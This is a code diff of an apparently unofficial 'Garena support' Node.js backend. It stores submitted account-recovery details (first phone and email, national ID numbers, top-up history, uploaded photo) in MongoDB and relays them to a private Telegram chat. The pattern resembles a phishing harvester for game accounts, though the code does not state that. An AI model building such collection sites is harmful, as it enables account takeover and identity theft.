@@ -1,17 +1,18 @@
 /**
- * Backend Server cho Ứng dụng Hỗ trợ Garena
- * @author Dev TanPhat (Professional Coder)
- * @date 2025-11-05
- * V10.0 - Them Log de kiem tra Environment Variables
+ * Backend Server V11.0 - Tích hợp MongoDB
+ * @author Dev TanPhat
  */
 
 // --- Import Dependencies ---
 const express = require('express');
 const path = require('path');
-const multer = require('multer');
-const fs = require('fs');
-const axios = require('axios');
-const FormData = require('form-data');
+const multer = require('multer');       // Xử lý upload file
+const fs = require('fs');               // Quản lý file/thư mục
+const axios = require('axios');         // Gửi request HTTP
+const FormData = require('form-data');  // Tạo form-data (để gửi file lên tele)
+const mongoose = require('mongoose'); // <-- Mới
+const short = require('short-uuid');  // <-- Mới
+const Ticket = require('./models/Ticket'); // <-- Mới
 require('dotenv').config();
 
 // --- Application Constants ---
@@ -23,6 +24,16 @@ const UPLOAD_DIR = '/tmp/uploads_tanphat';
 const REAL_SECRET_KEY = process.env.REAL_SECRET_KEY;
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+const MONGODB_URI = process.env.MONGODB_URI; // <-- Key Database Mới
+
+// --- [MỚI] Kết nối Database ---
+if (MONGODB_URI) {
+    mongoose.connect(MONGODB_URI)
+        .then(() => console.log("[MONGODB] Kết nối Database thành công!"))
+        .catch(err => console.error("[MONGODB ERROR] Không thể kết nối:", err));
+} else {
+    console.error("[MONGODB ERROR] Không tìm thấy MONGODB_URI. Vui lòng kiểm tra file .env hoặc Vercel Variables");
+}
 
 // --- Storage Engine (Multer) ---
 if (!fs.existsSync(UPLOAD_DIR)){
@@ -41,10 +52,9 @@ const upload = multer({ storage: storage });
 app.use(express.json()); 
 app.use(express.urlencoded({ extended: true }));
 
-
 // --- API Endpoints ---
 
-// Xử lý thủ công CÁC FILE TĨNH (HTML, CSS, JS)
+// Xử lý thủ công CÁC FILE TĨNH (HTML, CSS, JS) - Giữ nguyên từ V8.0
 app.get('/', (req, res) => {
     res.sendFile(path.join(process.cwd(), 'index.html'));
 });
@@ -74,11 +84,9 @@ app.post('/verify-key', (req, res) => {
 });
 
 /**
- * [POST] /submit-form
- * [NÂNG CẤP] Bắt lỗi Telegram
+ * [POST] /submit-form (Nâng cấp lớn)
  */
 app.post('/submit-form', (req, res) => {
-    // Phải chạy multer upload ở đây
     upload.single('attachment')(req, res, async function (err) { // Thêm async
         if (err) {
             console.error("Lỗi Multer:", err);
@@ -86,115 +94,154 @@ app.post('/submit-form', (req, res) => {
         }
         
         const textData = req.body; 
-        const fileData = req.file; 
-
-        // [SỬA LỖI V10.0] Thêm 1 dòng log để kiểm tra
-        console.log(`[V10.0 CHECK] Kiem tra Key: ${process.env.TELEGRAM_BOT_TOKEN ? 'Co Token' : 'KHONG CO TOKEN'}`);
-        
-        console.log("=====================================");
-        console.log("🔥 YÊU CẦU HỖ TRỢ MỚI VỪA VỀ! 🔥");
-        console.log(textData);
-        if (fileData) console.log(`(File đã lưu tại: ${fileData.path})`);
-        console.log("=====================================");
+        const fileData = req.file;
 
         try {
-            // [SỬA LỖI] Chờ (await) cho đến khi tele gửi xong
-            await sendTelegramNotification(textData, fileData);
-            
-            // Chỉ gửi thành công NẾU tele gửi thành công
-            res.json({ success: true, message: "Đã nhận được yêu cầu của bạn!" });
+            // 1. Tạo Mã Tra Cứu (MỚI)
+            // Dùng "translator" để tạo mã ngắn hơn, không có ký tự đặc biệt
+            const translator = short();
+            const ticketId = `GNA-${translator.new().slice(0, 6).toUpperCase()}`;
 
-        } catch (teleError) {
-            // [SỬA LỖI] Nếu tele lỗi, báo lỗi cho client
-            console.error("[TELEGRAM ERROR]", teleError.message);
+            // 2. Tạo Phiếu Yêu Cầu (MỚI)
+            const newTicket = new Ticket({
+                ticketId: ticketId,
+                status: 'Đang chờ xử lý',
+                
+                garenaId: textData['garena-id'],
+                dateLost: textData['date-lost'],
+                firstPhone: textData['first-phone'],
+                firstEmail: textData['first-email'],
+                currentPhone: textData['current-phone'],
+                currentEmail: textData['current-email'],
+                accountCccd: textData['account-cccd'],
+                accountName: textData['account-name'],
+                transactions: textData['transactions'],
+                description: textData['description'],
+                contactName: textData['contact-name'],
+                contactCccd: textData['contact-cccd'],
+                contactEmail: textData['contact-email'],
+                contactPhone: textData['contact-phone'],
+                
+                fileName: fileData ? fileData.filename : null
+            });
+
+            // 3. Lưu vào Database (MỚI)
+            await newTicket.save();
+            console.log(`[DB] Đã lưu phiếu mới: ${ticketId}`);
+
+            // 4. Gửi thông báo Telegram (kèm Mã Tra Cứu)
+            // (Chạy ngầm, không cần await để web phản hồi nhanh hơn)
+            sendTelegramNotification(newTicket, fileData)
+                .catch(teleError => console.error("[TELEGRAM ERROR]", teleError.message));
+            
+            // 5. Trả Mã Tra Cứu về cho người dùng (MỚI)
+            res.json({ 
+                success: true, 
+                message: "Đã nhận được yêu cầu của bạn!",
+                ticketId: ticketId // <-- Gửi mã về
+            });
+
+        } catch (dbError) {
+            console.error("[DB ERROR]", dbError.message);
+            // Báo lỗi cho người dùng
             res.status(500).json({ 
                 success: false, 
-                // Báo lỗi cụ thể cho bạn
-                message: `Lỗi Gửi Telegram: ${teleError.message}. Vui lòng kiểm tra lại Key/Token.` 
+                message: `Lỗi Database: Không thể tạo phiếu. Vui lòng thử lại.` 
             });
         }
     });
 });
 
-// --- Telegram Service ---
-
 /**
- * Gửi thông báo đến Telegram
- * [NÂNG CẤP] Ném lỗi (throw error) nếu thất bại
+ * [GET] /lookup-ticket/:id (API MỚI)
+ * Dùng để tra cứu phiếu
  */
-async function sendTelegramNotification(textData, fileData) {
+app.get('/lookup-ticket/:id', async (req, res) => {
+    try {
+        const ticketId = req.params.id.toUpperCase(); // Chuẩn hóa mã
+        const ticket = await Ticket.findOne({ ticketId: ticketId });
+
+        if (!ticket) {
+            // Nếu không thấy, trả về 404
+            return res.status(404).json({ success: false, message: "Không tìm thấy mã phiếu." });
+        }
+        
+        // Chỉ trả về thông tin cần thiết, không trả về CSDL
+        res.json({
+            success: true,
+            ticket: {
+                ticketId: ticket.ticketId,
+                status: ticket.status,
+                createdAt: ticket.createdAt,
+                description: ticket.description // Gửi cả mô tả để người dùng xem lại
+            }
+        });
+
+    } catch (error) {
+        console.error("[LOOKUP ERROR]", error.message);
+        res.status(500).json({ success: false, message: "Lỗi máy chủ khi tra cứu." });
+    }
+});
+
+
+// --- Telegram Service (Nâng cấp) ---
+async function sendTelegramNotification(ticket, fileData) {
+    // Bây giờ hàm này nhận vào ticket (phiếu)
     
-    const message = formatTelegramMessage(textData);
+    // [NÂNG CẤP] Thêm Mã Tra Cứu vào tin nhắn
+    let message = `<b>🔥 Yêu cầu Hỗ trợ Mới - ${ticket.ticketId} 🔥</b>\n\n`;
+    message += `<b>Tên đăng nhập Garena:</b> <pre>${ticket.garenaId || 'Không điền'}</pre>\n`;
+    message += `<b>Ngày mất TK:</b> ${ticket.dateLost || 'Không điền'}\n\n`;
+
+    message += `<b>--- Thông tin liên hệ (Khách) ---</b>\n`;
+    message += `<b>Họ tên:</b> ${ticket.contactName || 'Không điền'}\n`;
+    message += `<b>Email:</b> <pre>${ticket.contactEmail || 'Không điền'}</pre>\n`;
+    message += `<b>SĐT:</b> <pre>${ticket.contactPhone || 'Không điền'}</pre>\n\n`;
+    
+    message += `<b>--- Chi tiết vấn đề ---</b>\n`;
+    message += `<pre>${ticket.description || 'Không điền'}</pre>\n\n`;
+    
+    // (Bạn có thể thêm lại các trường khác nếu muốn)
+    // message += `<b>SĐT đầu tiên:</b> <pre>${ticket.firstPhone || 'Không điền'}</pre>\n`;
+    
     const telegramApi = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
     try {
         if (fileData) {
-            // --- Kịch bản 1: Gửi Ảnh + Caption ---
             const url = `${telegramApi}/sendPhoto`;
             const form = new FormData();
-            
             form.append('chat_id', TELEGRAM_CHAT_ID);
             form.append('caption', message);
             form.append('parse_mode', 'HTML');
             form.append('photo', fs.createReadStream(fileData.path));
+            
+            await axios.post(url, form, { headers: form.getHeaders() });
+            console.log(`[TELEGRAM] Gửi ảnh cho phiếu ${ticket.ticketId} thành công!`);
 
-            await axios.post(url, form, {
-                headers: form.getHeaders()
-            });
-            console.log("[TELEGRAM] Gửi ảnh và thông báo thành công!");
-
+            // Xóa file tạm
             fs.unlink(fileData.path, (err) => {
-                if (err) console.error("Không xóa được file tạm:", err);
+                if(err) console.error("Không xóa được file tạm:", fileData.path);
             });
 
         } else {
-            // --- Kịch bản 2: Chỉ gửi Text ---
             const url = `${telegramApi}/sendMessage`;
             await axios.post(url, {
                 chat_id: TELEGRAM_CHAT_ID,
                 text: message,
                 parse_mode: 'HTML'
             });
-            console.log("[TELEGRAM] Gửi thông báo (text) thành công!");
+            console.log(`[TELEGRAM] Gửi tin nhắn cho phiếu ${ticket.ticketId} thành công!`);
         }
     } catch (error) {
-        // [SỬA LỖI] Ném lỗi ra để /submit-form bắt được
-        console.error("[TELEGRAM ERROR] Không gửi được tin nhắn:");
+        // Ném lỗi ra để /submit-form bắt được (nếu cần)
+        let errorMsg = error.message;
         if (error.response && error.response.data) {
-            console.error(error.response.data.description);
-            throw new Error(error.response.data.description); // Ném lỗi cụ thể
-        } else {
-            console.error(error.message);
-            throw error; // Ném lỗi chung
+            errorMsg = error.response.data.description;
         }
+        console.error(`[TELEGRAM ERROR] Không gửi được tin nhắn cho ${ticket.ticketId}: ${errorMsg}`);
+        // Không ném lỗi ra nữa, để client nhận phản hồi nhanh
+        // throw new Error(errorMsg); 
     }
-}
-
-/**
- * Định dạng nội dung tin nhắn Telegram
- */
-function formatTelegramMessage(data) {
-    const f = (field) => (data && data[field]) ? data[field] : '';
-
-    let msg = `<b>🔥 Yêu cầu Hỗ trợ Mới - Dev TanPhat 🔥</b>\n\n`;
-    msg += `<b>Tên đăng nhập Garena:</b> <pre>${f('garena-id')}</pre>\n`;
-    msg += `<b>Ngày mất TK:</b> ${f('date-lost')}\n\n`;
-    msg += `<b>--- Thông tin xác thực gốc ---</b>\n`;
-    msg += `<b>SĐT đầu tiên:</b> <pre>${f('first-phone')}</pre>\n`;
-    msg += `<b>Email đầu tiên:</b> <pre>${f('first-email')}</pre>\n`;
-    msg += `<b>SĐT hiện tại (trước khi mất):</b> <pre>${f('current-phone')}</pre>\n`;
-    msg += `<b>Email hiện tại (trước khi mất):</b> <pre>${f('current-email')}</pre>\n`;
-    msg += `<b>CCCD trong TK:</b> <pre>${f('account-cccd')}</pre>\n`;
-    msg += `<b>Họ tên trong TK:</b> <pre>${f('account-name')}</pre>\n`;
-    msg += `<b>Giao dịch nạp:</b>\n<pre>${f('transactions')}</pre>\n\n`;
-    msg += `<b>--- Thông tin liên hệ (Khách) ---</b>\n`;
-    msg += `<b>Họ tên:</b> ${f('contact-name')}\n`;
-    msg += `<b>Email:</b> <pre>${f('contact-email')}</pre>\n`;
-    msg += `<b>SĐT:</b> <pre>${f('contact-phone')}</pre>\n`;
-    msg += `<b>CCCD (để cập nhật):</b> <pre>${f('contact-cccd')}</pre>\n\n`;
-    msg += `<b>--- Chi tiết vấn đề ---</b>\n`;
-    msg += `<pre>${f('description')}</pre>\n`;
-    return msg;
 }
 
 // --- Server Initialization ---
